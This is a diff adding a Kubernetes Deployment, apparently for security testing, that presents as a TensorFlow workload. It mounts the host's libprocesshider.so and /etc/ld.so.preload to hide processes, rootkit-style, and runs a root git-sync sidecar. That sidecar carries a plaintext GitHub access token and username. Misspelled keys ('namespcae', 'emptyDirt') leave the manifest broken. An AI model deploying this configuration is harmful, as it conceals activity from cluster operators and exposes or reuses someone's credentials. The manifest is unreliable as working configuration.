@@ -1,0 +1,66 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    owner: sec-tester
+  name: git-test2
+  namespcae: stylistbw
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      owner: sec-tester
+  template:
+    metadata:
+      labels:
+        owner: sec-tester
+    spec:
+      containers:
+      - image: ehost-repo.xyz/research/tensorflow:2.6.0-11.2-8
+        name: git-test
+        ports:
+        - containerPort: 8888
+        volumeMounts:
+        - mountPath: /usr/local/lib/libprocesshider.so
+          name: hideprocess
+          readOnly: true
+        - mountPath: /etc/ld.so.preload
+          name: preload
+          readOnly: true
+        - mountPath: /home/git
+          name: git
+      - name: git-sync
+        image: k8s.gcr.io/git-sync/git-sync:v3.2.2
+        volumeMounts:
+        - name: git-volume
+          mountPath: /home/git
+        env:
+        - name: GIT_SYNC_REPO
+          value: "https://github.com/sbw210/3-BB_Cloud-Funtion.git" #(Private repo-path-you-want-to-clone)
+        - name: GIT_SYNC_USERNAME
+          value: "sbw210"  ##The username for the repository
+        - name: GIT_SYNC_PASSWORD
+          value: "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" #(The Personal Access Token for the repository)
+        - name: GIT_SYNC_BRANCH
+          value: "main" #(repo-branch)
+        - name: GIT_SYNC_ROOT #(싱크맞추려면 env 항목 사용할 것)
+          value: /home/git
+        - name: GIT_SYNC_PERMISSIONS
+          value: "0777"
+        - name: GIT_SYNC_ONE_TIME #(싱크 후, 연결지속 > 이후 git에서 commit update되면 컨테이너에 반영됨)
+          value: "false"
+        securityContext:
+          runAsUser: 0
+      imagePullSecrets:
+      - name: ehost-repo.xyz
+      volumes:
+      - hostPath:
+          type: File
+          path: /usr/local/lib/libprocesshider.so
+        name: hideprocess
+      - hostPath:
+          type: File
+          path: /etc/ld.so.preload
+        name: preload
+      - name: git-volume
+        emptyDirt: {}
